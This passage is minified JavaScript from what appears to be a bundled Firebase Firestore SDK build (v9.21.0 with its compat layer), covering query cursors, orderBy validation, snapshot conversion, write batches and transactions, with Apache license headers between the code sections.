L(M.INVALID_ARGUMENT,"Invalid query. You must not call endAt() or endBefore() before calling orderBy().");const r=new Wo(t,n);return function(e,t){if(null===nv(e)){const n=Wd(e);null!==n&&XI(e,n,t.field)}}(e,r),r}(e._query,this._field,this._direction);return new Kt(e.firestore,e.converter,function(e,t){const n=e.explicitOrderBy.concat([t]);return new Jr(e.path,e.collectionGroup,n,e.filters.slice(),e.limit,e.limitType,e.startAt,e.endAt)}(e._query,t))}}function h9(e,t="asc"){const n=t,r=of("orderBy",e);return Gv._create(r,n)}class lf extends Yu{constructor(e,t,n){super(),this.type=e,this._limit=t,this._limitType=n}static _create(e,t,n){return new lf(e,t,n)}_apply(e){return new Kt(e.firestore,e.converter,Xh(e._query,this._limit,this._limitType))}}function d9(e){return OI("limit",e),lf._create("limit",e,"F")}function f9(e){return OI("limitToLast",e),lf._create("limitToLast",e,"L")}class uf extends Yu{constructor(e,t,n){super(),this.type=e,this._docOrFields=t,this._inclusive=n}static _create(e,t,n){return new uf(e,t,n)}_apply(e){const t=KI(e,this.type,this._docOrFields,this._inclusive);return new Kt(e.firestore,e.converter,(n=e._query,r=t,new Jr(n.path,n.collectionGroup,n.explicitOrderBy.slice(),n.filters.slice(),n.limit,n.limitType,r,n.endAt)));var n,r}}function p9(...e){return uf._create("startAt",e,!0)}function m9(...e){return uf._create("startAfter",e,!1)}class cf extends Yu{constructor(e,t,n){super(),this.type=e,this._docOrFields=t,this._inclusive=n}static _create(e,t,n){return new cf(e,t,n)}_apply(e){const t=KI(e,this.type,this._docOrFields,this._inclusive);return new Kt(e.firestore,e.converter,(n=e._query,r=t,new Jr(n.path,n.collectionGroup,n.explicitOrderBy.slice(),n.filters.slice(),n.limit,n.limitType,n.startAt,r)));var n,r}}function g9(...e){return cf._create("endBefore",e,!1)}function y9(...e){return cf._create("endAt",e,!0)}function KI(e,t,n,r){if(n[0]=Et(n[0]),n[0]instanceof fu)return function(e,t,n,r,i){if(!r)throw new L(M.NOT_FOUND,`Can't use a DocumentSnapshot that doesn't exist for ${n}().`);const s=[];for(const n of Rs(e))if(n.field.isKeyField())s.push(Us(t,r.key));else{const e=r.data.field(n.field);if(Yd(e))throw new L(M.INVALID_ARGUMENT,'Invalid query. You are trying to start or end a query using a document for which the field "'+n.field+'" is an uncommitted server timestamp. (Since the value of this field is unknown, you cannot start/end a query with it.)');if(null===e){const e=n.field.canonicalString();throw new L(M.INVALID_ARGUMENT,`Invalid query. You are trying to start or end a query using a document for which the field '${e}' (used as the orderBy) does not exist.`)}s.push(e)}return new zi(s,i)}(e._query,e.firestore._databaseId,t,n[0]._document,r);{const i=no(e.firestore);return function(e,t,n,r,i,s){const o=e.explicitOrderBy;if(i.length>o.length)throw new L(M.INVALID_ARGUMENT,`Too many arguments provided to ${r}(). The number of arguments must be less than or equal to the number of orderBy() clauses`);const a=[];for(let s=0;s<i.length;s++){const l=i[s];if(o[s].field.isKeyField()){if("string"!=typeof l)throw new L(M.INVALID_ARGUMENT,`Invalid query. Expected a string for document ID in ${r}(), but got a ${typeof l}`);if(!rv(e)&&-1!==l.indexOf("/"))throw new L(M.INVALID_ARGUMENT,`Invalid query. When querying a collection and ordering by documentId(), the value passed to ${r}() must be a plain document ID, but '${l}' contains a slash.`);const n=e.path.child(Te.fromString(l));if(!B.isDocumentKey(n))throw new L(M.INVALID_ARGUMENT,`Invalid query. When querying a collection group and ordering by documentId(), the value passed to ${r}() must result in a valid document path, but '${n}' is not because it contains an odd number of segments.`);const i=new B(n);a.push(Us(t,i))}else{const e=qI(n,r,l);a.push(e)}}return new zi(a,s)}(e._query,e.firestore._databaseId,i,t,n,r)}}function US(e,t,n){if("string"==typeof(n=Et(n))){if(""===n)throw new L(M.INVALID_ARGUMENT,"Invalid query. When querying with documentId(), you must provide a valid document ID, but it was an empty string.");if(!rv(t)&&-1!==n.indexOf("/"))throw new L(M.INVALID_ARGUMENT,`Invalid query. When querying a collection by documentId(), you must provide a plain document ID, but '${n}' contains a '/' character.`);const r=t.path.child(Te.fromString(n));if(!B.isDocumentKey(r))throw new L(M.INVALID_ARGUMENT,`Invalid query. When querying a collection group by documentId(), the value provided must result in a valid document path, but '${r}' is not because it has an odd number of segments (${r.length}).`);return Us(e,new B(r))}if(n instanceof Ke)return Us(e,n._key);throw new L(M.INVALID_ARGUMENT,`Invalid query. When querying with documentId(), you must provide a valid string or a DocumentReference, but it was: ${tf(n)}.`)}function zS(e,t){if(!Array.isArray(e)||0===e.length)throw new L(M.INVALID_ARGUMENT,`Invalid Query. A non-empty array is required for '${t.toString()}' filters.`)}function QI(e,t){if(t.isInequality()){const n=Wd(e),r=t.field;if(null!==n&&!n.isEqual(r))throw new L(M.INVALID_ARGUMENT,`Invalid query. All where filters with an inequality (<, <=, !=, not-in, >, or >=) must be on the same field. But you have inequality filters on '${n.toString()}' and '${r.toString()}'`);const i=nv(e);null!==i&&XI(e,r,i)}const n=function(e,t){for(const n of e)for(const e of n.getFlattenedFilters())if(t.indexOf(e.op)>=0)return e.op;return null}(e.filters,function(e){switch(e){case"!=":return["!=","not-in"];case"array-contains-any":case"in":return["not-in"];case"not-in":return["array-contains-any","in","not-in","!="];default:return[]}}(t.op));if(null!==n)throw n===t.op?new L(M.INVALID_ARGUMENT,`Invalid query. You cannot use more than one '${t.op.toString()}' filter.`):new L(M.INVALID_ARGUMENT,`Invalid query. You cannot use '${t.op.toString()}' filters with '${n.toString()}' filters.`)}function XI(e,t,n){if(!n.isEqual(t))throw new L(M.INVALID_ARGUMENT,`Invalid query. You have a where filter with an inequality (<, <=, !=, not-in, >, or >=) on field '${t.toString()}' and so you must also use '${t.toString()}' as your first argument to orderBy(), but your first orderBy() is on field '${n.toString()}' instead.`)}class Hv{convertValue(e,t="none"){switch(Vs(e)){case 0:return null;case 1:return e.booleanValue;case 2:return ut(e.integerValue||e.doubleValue);case 3:return this.convertTimestamp(e.timestampValue);case 4:return this.convertServerTimestamp(e,t);case 5:return e.stringValue;case 6:return this.convertBytes(Fi(e.bytesValue));case 7:return this.convertReference(e.referenceValue);case 8:return this.convertGeoPoint(e.geoPointValue);case 9:return this.convertArray(e.arrayValue,t);case 10:return this.convertObject(e.mapValue,t);default:throw G()}}convertObject(e,t){return this.convertObjectMap(e.fields,t)}convertObjectMap(e,t="none"){const n={};return eo(e,((e,r)=>{n[e]=this.convertValue(r,t)})),n}convertGeoPoint(e){return new nf(ut(e.latitude),ut(e.longitude))}convertArray(e,t){return(e.values||[]).map((e=>this.convertValue(e,t)))}convertServerTimestamp(e,t){switch(t){case"previous":const n=ev(e);return null==n?null:this.convertValue(n,t);case"estimate":return this.convertTimestamp(ou(e));default:return null}}convertTimestamp(e){const t=Li(e);return new et(t.seconds,t.nanos)}convertDocumentKey(e,t){const n=Te.fromString(e);te(Wx(n));const r=new Vi(n.get(1),n.get(3)),i=new B(n.popFirst(5));return r.isEqual(t)||mt(`Document ${i} contains a document reference within a different database (${r.projectId}/${r.database}) which is not supported. It will be treated as a reference in the current database (${t.projectId}/${t.database}) instead.`),i
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */}}function hf(e,t,n){let r;return r=e?n&&(n.merge||n.mergeFields)?e.toFirestore(t,n):e.toFirestore(t):t,r}class v9 extends Hv{constructor(e){super(),this.firestore=e}convertBytes(e){return new _r(e)}convertReference(e){const t=this.convertDocumentKey(e,this.firestore._databaseId);return new Ke(this.firestore,null,t)}}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class ks{constructor(e,t){this.hasPendingWrites=e,this.fromCache=t}isEqual(e){return this.hasPendingWrites===e.hasPendingWrites&&this.fromCache===e.fromCache}}class Kr extends fu{constructor(e,t,n,r,i,s){super(e,t,n,r,s),this._firestore=e,this._firestoreImpl=e,this.metadata=i}exists(){return super.exists()}data(e={}){if(this._document){if(this._converter){const t=new Ml(this._firestore,this._userDataWriter,this._key,this._document,this.metadata,null);return this._converter.fromFirestore(t,e)}return this._userDataWriter.convertValue(this._document.data.value,e.serverTimestamps)}}get(e,t={}){if(this._document){const n=this._document.data.field(of("DocumentSnapshot.get",e));if(null!==n)return this._userDataWriter.convertValue(n,t.serverTimestamps)}}}class Ml extends Kr{data(e={}){return super.data(e)}}class qi{constructor(e,t,n,r){this._firestore=e,this._userDataWriter=t,this._snapshot=r,this.metadata=new ks(r.hasPendingWrites,r.fromCache),this.query=n}get docs(){const e=[];return this.forEach((t=>e.push(t))),e}get size(){return this._snapshot.docs.size}get empty(){return 0===this.size}forEach(e,t){this._snapshot.docs.forEach((n=>{e.call(t,new Ml(this._firestore,this._userDataWriter,n.key,n,new ks(this._snapshot.mutatedKeys.has(n.key),this._snapshot.fromCache),this.query.converter))}))}docChanges(e={}){const t=!!e.includeMetadataChanges;if(t&&this._snapshot.excludesMetadataChanges)throw new L(M.INVALID_ARGUMENT,"To include metadata changes with your document changes, you must also pass { includeMetadataChanges:true } to onSnapshot().");return this._cachedChanges&&this._cachedChangesIncludeMetadataChanges===t||(this._cachedChanges=function(e,t){if(e._snapshot.oldDocs.isEmpty()){let t=0;return e._snapshot.docChanges.map((n=>{const r=new Ml(e._firestore,e._userDataWriter,n.doc.key,n.doc,new ks(e._snapshot.mutatedKeys.has(n.doc.key),e._snapshot.fromCache),e.query.converter);return n.doc,{type:"added",doc:r,oldIndex:-1,newIndex:t++}}))}{let n=e._snapshot.oldDocs;return e._snapshot.docChanges.filter((e=>t||3!==e.type)).map((t=>{const r=new Ml(e._firestore,e._userDataWriter,t.doc.key,t.doc,new ks(e._snapshot.mutatedKeys.has(t.doc.key),e._snapshot.fromCache),e.query.converter);let i=-1,s=-1;return 0!==t.type&&(i=n.indexOf(t.doc.key),n=n.delete(t.doc.key)),1!==t.type&&(n=n.add(t.doc),s=n.indexOf(t.doc.key)),{type:w9(t.type),doc:r,oldIndex:i,newIndex:s}}))}}(this,t),this._cachedChangesIncludeMetadataChanges=t),this._cachedChanges}}function w9(e){switch(e){case 0:return"added";case 2:case 3:return"modified";case 1:return"removed";default:return G()}}function JI(e,t){return e instanceof Kr&&t instanceof Kr?e._firestore===t._firestore&&e._key.isEqual(t._key)&&(null===e._document?null===t._document:e._document.isEqual(t._document))&&e._converter===t._converter:e instanceof qi&&t instanceof qi&&e._firestore===t._firestore&&LI(e.query,t.query)&&e.metadata.isEqual(t.metadata)&&e._snapshot.isEqual(t._snapshot)}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function S9(e){e=ke(e,Ke);const t=ke(e.firestore,ht);return RI(Vt(t),e._key).then((n=>Kv(t,e,n)))}class io extends Hv{constructor(e){super(),this.firestore=e}convertBytes(e){return new _r(e)}convertReference(e){const t=this.convertDocumentKey(e,this.firestore._databaseId);return new Ke(this.firestore,null,t)}}function _9(e){e=ke(e,Ke);const t=ke(e.firestore,ht),n=Vt(t),r=new io(t);return FF(n,e._key).then((n=>new Kr(t,r,e._key,n,new ks(null!==n&&n.hasLocalMutations,!0),e.converter)))}function E9(e){e=ke(e,Ke);const t=ke(e.firestore,ht);return RI(Vt(t),e._key,{source:"server"}).then((n=>Kv(t,e,n)))}function T9(e){e=ke(e,Kt);const t=ke(e.firestore,ht),n=Vt(t),r=new io(t);return HI(e._query),AI(n,e._query).then((n=>new qi(t,r,e,n)))}function x9(e){e=ke(e,Kt);const t=ke(e.firestore,ht),n=Vt(t),r=new io(t);return VF(n,e._query).then((n=>new qi(t,r,e,n)))}function I9(e){e=ke(e,Kt);const t=ke(e.firestore,ht),n=Vt(t),r=new io(t);return AI(n,e._query,{source:"server"}).then((n=>new qi(t,r,e,n)))}function BS(e,t,n){e=ke(e,Ke);const r=ke(e.firestore,ht),i=hf(e.converter,t,n);return Wu(r,[sf(no(r),"setDoc",e._key,i,null!==e.converter,n).toMutation(e._key,Ze.none())])}function jS(e,t,n,...r){e=ke(e,Ke);const i=ke(e.firestore,ht),s=no(i);let o;return o="string"==typeof(t=Et(t))||t instanceof ji?Bv(s,"updateDoc",e._key,t,n,r):zv(s,"updateDoc",e._key,t),Wu(i,[o.toMutation(e._key,Ze.exists(!0))])}function k9(e){return Wu(ke(e.firestore,ht),[new xa(e._key,Ze.none())])}function D9(e,t){const n=ke(e.firestore,ht),r=sd(e),i=hf(e.converter,t);return Wu(n,[sf(no(e.firestore),"addDoc",r._key,i,null!==e.converter,{}).toMutation(r._key,Ze.exists(!1))]).then((()=>r))}function ZI(e,...t){var n,r,i;e=Et(e);let s={includeMetadataChanges:!1},o=0;"object"!=typeof t[o]||yg(t[o])||(s=t[o],o++);const a={includeMetadataChanges:s.includeMetadataChanges};if(yg(t[o])){const e=t[o];t[o]=null===(n=e.next)||void 0===n?void 0:n.bind(e),t[o+1]=null===(r=e.error)||void 0===r?void 0:r.bind(e),t[o+2]=null===(i=e.complete)||void 0===i?void 0:i.bind(e)}let l,u,c;if(e instanceof Ke)u=ke(e.firestore,ht),c=Ea(e._key.path),l={next:n=>{t[o]&&t[o](Kv(u,e,n))},error:t[o+1],complete:t[o+2]};else{const n=ke(e,Kt);u=ke(n.firestore,ht),c=n._query;const r=new io(u);l={next:e=>{t[o]&&t[o](new qi(u,r,n,e))},error:t[o+1],complete:t[o+2]},HI(e._query)}return function(e,t,n,r){const i=new Zd(r),s=new Cv(t,i,n);return e.asyncQueue.enqueueAndForget((async()=>Iv(await pa(e),s))),()=>{i.Sc(),e.asyncQueue.enqueueAndForget((async()=>kv(await pa(e),s)))}}(Vt(u),c,a,l)}function C9(e,t){return UF(Vt(e=ke(e,ht)),yg(t)?t:{next:t})}function Wu(e,t){return function(e,t){const n=new Pt;return e.asyncQueue.enqueueAndForget((async()=>pF(await Fv(e),t,n))),n.promise}(Vt(e),t)}function Kv(e,t,n){const r=n.docs.get(t._key),i=new io(e);return new Kr(e,i,t._key,r,new ks(n.hasPendingWrites,n.fromCache),t.converter)}
/**
 * @license
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const N9={maxAttempts:5};
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class M9{constructor(e,t){this._firestore=e,this._commitHandler=t,this._mutations=[],this._committed=!1,this._dataReader=no(e)}set(e,t,n){this._verifyNotCommitted();const r=mi(e,this._firestore),i=hf(r.converter,t,n),s=sf(this._dataReader,"WriteBatch.set",r._key,i,null!==r.converter,n);return this._mutations.push(s.toMutation(r._key,Ze.none())),this}update(e,t,n,...r){this._verifyNotCommitted();const i=mi(e,this._firestore);let s;return s="string"==typeof(t=Et(t))||t instanceof ji?Bv(this._dataReader,"WriteBatch.update",i._key,t,n,r):zv(this._dataReader,"WriteBatch.update",i._key,t),this._mutations.push(s.toMutation(i._key,Ze.exists(!0))),this}delete(e){this._verifyNotCommitted();const t=mi(e,this._firestore);return this._mutations=this._mutations.concat(new xa(t._key,Ze.none())),this}commit(){return this._verifyNotCommitted(),this._committed=!0,this._mutations.length>0?this._commitHandler(this._mutations):Promise.resolve()}_verifyNotCommitted(){if(this._committed)throw new L(M.FAILED_PRECONDITION,"A write batch can no longer be used after commit() has been called.")}}function mi(e,t){if((e=Et(e)).firestore!==t)throw new L(M.INVALID_ARGUMENT,"Provided document reference is from a different Firestore instance.");return e}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class R9 extends class{constructor(e,t){this._firestore=e,this._transaction=t,this._dataReader=no(e)}get(e){const t=mi(e,this._firestore),n=new v9(this._firestore);return this._transaction.lookup([t._key]).then((e=>{if(!e||1!==e.length)return G();const r=e[0];if(r.isFoundDocument())return new fu(this._firestore,n,r.key,r,t.converter);if(r.isNoDocument())return new fu(this._firestore,n,t._key,null,t.converter);throw G()}))}set(e,t,n){const r=mi(e,this._firestore),i=hf(r.converter,t,n),s=sf(this._dataReader,"Transaction.set",r._key,i,null!==r.converter,n);return this._transaction.set(r._key,s),this}update(e,t,n,...r){const i=mi(e,this._firestore);let s;return s="string"==typeof(t=Et(t))||t instanceof ji?Bv(this._dataReader,"Transaction.update",i._key,t,n,r):zv(this._dataReader,"Transaction.update",i._key,t),this._transaction.update(i._key,s),this}delete(e){const t=mi(e,this._firestore);return this._transaction.delete(t._key),this}}{constructor(e,t){super(e,t),this._firestore=e}get(e){const t=mi(e,this._firestore),n=new io(this._firestore);return super.get(e).then((e=>new Kr(this._firestore,n,t._key,e._document,new ks(!1,!1),t.converter)))}}function A9(e,t,n){e=ke(e,ht);const r=Object.assign(Object.assign({},N9),n);return function(e){if(e.maxAttempts<1)throw new L(M.INVALID_ARGUMENT,"Max attempts must be at least 1")}(r),function(e,t,n){const r=new Pt;return e.asyncQueue.enqueueAndForget((async()=>{const i=await PF(e);new bF(e.asyncQueue,i,n,t,r).run()})),r.promise}(Vt(e),(n=>t(new R9(e,n))),r)}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function b9(){return new qu("deleteField")}function O9(){return new Uv("serverTimestamp")}function P9(...e){return new s9("arrayUnion",e)}function $9(...e){return new o9("arrayRemove",e)}function L9(e){return new a9("increment",e)}!function(e,t=!0){_a="9.21.0",na(new Ls("firestore",((e,{instanceIdentifier:n,options:r})=>{const i=e.getProvider("app").getImmediate(),s=new ht(new q4(e.getProvider("auth-internal")),new H4(e.getProvider("app-check-internal")),function(e,t){if(!Object.prototype.hasOwnProperty.apply(e.options,["projectId"]))throw new L(M.INVALID_ARGUMENT,'"projectId" not provided in firebase.initializeApp.');return new Vi(e.options.projectId,t)}(i,n),i);return r=Object.assign({useFetchStreams:t},r),s._setSettings(r),s}),"PUBLIC").setMultipleInstances(!0)),Mi(Fw,"3.11.0",e),Mi(Fw,"3.11.0","esm2017")}();const F9="@firebase/firestore-compat",V9="0.3.8";
/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Qv(e,t){if(void 0===t)return{merge:!1};if(void 0!==t.mergeFields&&void 0!==t.merge)throw new L("invalid-argument",`Invalid options passed to function ${e}(): You cannot specify both "merge" and "mergeFields".`);return t}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function qS(){if(typeof Uint8Array>"u")throw new L("unimplemented","Uint8Arrays are not available in this environment.")}function YS(){if(!S$())throw new L("unimplemented","Blobs are unavailable in Firestore in this environment.")}class pu{constructor(e){this._delegate=e}static fromBase64String(e){return YS(),new pu(_r.fromBase64String(e))}static fromUint8Array(e){return qS(),new pu(_r.fromUint8Array(e))}toBase64(){return YS(),this._delegate.toBase64()}toUint8Array(){return qS(),this._delegate.toUint8Array()}isEqual(e){return this._delegate.isEqual(e._delegate)}toString(){return"Blob(base64: "+this.toBase64()+")"}}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function wg(e){return U9(e,["next","error","complete"])}function U9(e,t){if("object"!=typeof e||null===e)return!1;const n=e;for(const e of t)if(e in n&&"function"==typeof n[e])return!0;return!1}
/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class z9{enableIndexedDbPersistence(e,t){return HF(e._delegate,{forceOwnership:t})}enableMultiTabIndexedDbPersistence(e){return KF(e._delegate)}clearIndexedDbPersistence(e){return QF(e._delegate)}}class ek{constructor(e,t,n){this._delegate=t,this._persistenceProvider=n,this.INTERNAL={delete:()=>this.terminate()},e instanceof Vi||(this._appCompat=e)}get _databaseId(){return this._delegate._databaseId}settings(e){const t=this._delegate._getSettings();!e.merge&&t.host!==e.host&&sr("You are overriding the original host. If you did not intend to override your settings, use {merge: true}."),e.merge&&delete(e=Object.assign(Object.assign({},t),e)).merge,this._delegate._setSettings(e)}useEmulator(e,t,n={}){jF(this._delegate,e,t,n)}enableNetwork(){return JF(this._delegate)}disableNetwork(){return ZF(this._delegate)}enablePersistence(e){let t=!1,n=!1;return e&&(t=!!e.synchronizeTabs,n=!!e.experimentalForceOwningTab,bI("synchronizeTabs",t,"experimentalForceOwningTab",n)),t?this._persistenceProvider.enableMultiTabIndexedDbPersistence(this):this._persistenceProvider.enableIndexedDbPersistence(this,n)}clearPersistence(){return this._persistenceProvider.clearIndexedDbPersistence(this)}terminate(){return this._appCompat&&(this._appCompat._removeServiceInstance("firestore-compat"),this._appCompat._removeServiceInstance("firestore")),this._delegate._delete()}waitForPendingWrites(){return XF(this._delegate)}onSnapshotsInSync(e){return C9(this._delegate,e)}get app(){if(!this._appCompat)throw new L("failed-precondition","Firestore was not initialized using the Firebase SDK. 'app' is not available");return this._appCompat}collection(e){try{return new ma(this,PI(this._delegate,e))}catch(e){throw un(e,"collection()","Firestore.collection()")}}doc(e){try{return new Bn(this,sd(this._delegate,e))}catch(e){throw un(e,"doc()","Firestore.doc()")}}collectionGroup(e){try{return new ln(this,qF(this._delegate,e))}catch(e){throw un(e,"collectionGroup()","Firestore.collectionGroup()")}}runTransaction(e){return A9(this._delegate,(t=>e(new tk(this,t))))}batch(){return Vt(this._delegate),new nk(new M9(this._delegate,(e=>Wu(this._delegate,e))))}loadBundle(e){return e9(this._delegate,e)}namedQuery(e){return t9(this._delegate,e).then((e=>e?new ln(this,e):null))}}class df extends Hv{constructor(e){super(),this.firestore=e}convertBytes(e){return new pu(new _r(e))}convertReference(e){const t=this.convertDocumentKey(e,this.firestore._databaseId);return Bn.forKey(t,this.firestore,null)}}function B9(e){U4(e)}class tk{constructor(e,t){this._firestore=e,this._delegate=t,this._userDataWriter=new df(e)}get(e){const t=Ds(e);return this._delegate.get(t).then((e=>new mu(this._firestore,new Kr(this._firestore._delegate,this._userDataWriter,e._key,e._document,e.metadata,t.converter))))}set(e,t,n){const r=Ds(e);return n?(Qv("Transaction.set",n),this._delegate.set(r,t,n)):this._delegate.set(r,t),this}update(e,t,n,...r){const i=Ds(e);return 2===arguments.length?this._delegate.update(i,t):this._delegate.update(i,t,n,...r),this}delete(e){const t=Ds(e);return this._delegate.delete(t),this}}class nk{constructor(e){this._delegate=e}set(e,t,n){const r=Ds(e);return n?(Qv("WriteBatch.set",n),this._delegate.set(r,t,n)):this._delegate.set(r,t),this}update(e,t,n,...r){const i=Ds(e);return 2===arguments.length?this._delegate.update(i,t):this._delegate.update(i,t,n,...r),this}delete(e){const t=Ds(e);return this._delegate.delete(t),this}commit(){return this._delegate.commit()}}class Gs{constructor(e,t,n){this._firestore=e,this._userDataWriter=t,this._delegate=n}fromFirestore(e,t){const n=new Ml(this._firestore._delegate,this._userDataWriter,e._key,e._document,e.metadata,null);return this._delegate.fromFirestore(new gu(this._firestore,n),t??{})}toFirestore(e,t){return t?this._delegate.toFirestore(e,t):this._delegate.toFirestore(e)}static getInstance(e,t){const n=Gs.INSTANCES;let r=n.get(e);r||(r=new WeakMap,n.set(e,r));let i=r.get(t);return i||(i=new Gs(e,new df(e),t),r.set(t,i)),i}}Gs.INSTANCES=new WeakMap;class Bn{constructor(e,t){this.firestore=e,this._delegate=t,this._userDataWriter=new df(e)}static forPath(e,t,n){if(e.length%2!=0)throw new L("invalid-argument",`Invalid document reference. Document references must have an even number of segments, but ${e.canonicalString()} has ${e.length}`);return new Bn(t,new Ke(t._delegate,n,new B(e)))}static forKey(e,t,n){return new Bn(t,new Ke(t._delegate,n,e))}get id(){return this._delegate.id}get parent(){return new ma(this.firestore,this._delegate.parent)}get path(){return this._delegate.path}collection(e){try{return new ma(this.firestore,PI(this._delegate,e))}catch(e){throw un(e,"collection()","DocumentReference.collection()")}}isEqual(e){return(e=Et(e))instanceof Ke&&$I(this._delegate,e)}set(e,t){t=Qv("DocumentReference.set",t);try{return t?BS(this._delegate,e,t):BS(this._delegate,e)}catch(e){throw un(e,"setDoc()","DocumentReference.set()")}}update(e,t,...n){try{return 1===arguments.length?jS(this._delegate,e):jS(this._delegate,e,t,...n)}catch(e){throw un(e,"updateDoc()","DocumentReference.update()")}}delete(){return k9(this._delegate)}onSnapshot(...e){const t=rk(e),n=ik(e,(e=>new mu(this.firestore,new Kr(this.firestore._delegate,this._userDataWriter,e._key,e._document,e.metadata,this._delegate.converter))));return ZI(this._delegate,t,n)}get(e){let t;return t="cache"===(null==e?void 0:e.source)?_9(this._delegate):"server"===(null==e?void 0:e.source)?E9(this._delegate):S9(this._delegate),t.then((e=>new mu(this.firestore,new Kr(this.firestore._delegate,this._userDataWriter,e._key,e._document,e.metadata,this._delegate.converter))))}withConverter(e){return new Bn(this.firestore,e?this._delegate.withConverter(Gs.getInstance(this.firestore,e)):this._delegate.withConverter(null))}}function un(e,t,n){return e.message=e.message.replace(t,n),e}function rk(e){for(const t of e)if("object"==typeof t&&!wg(t))return t;return{}}function ik(e,t){var n,r;let i;return i=wg(e[0])?e[0]:wg(e[1])?e[1]:"function"==typeof e[0]?{next:e[0],error:e[1],complete:e[2]}:{next:e[1],error:e[2],complete:e[3]},{next:e=>{i.next&&i.next(t(e))},error:null===(n=i.error)||void 0===n?void 0:n.bind(i),complete:null===(r=i.complete)||void 0===r?void 0:r.bind(i)}}class mu{constructor(e,t){this._firestore=e,this._delegate=t}get ref(){return new Bn(this._firestore,this._delegate.ref)}get id(){return 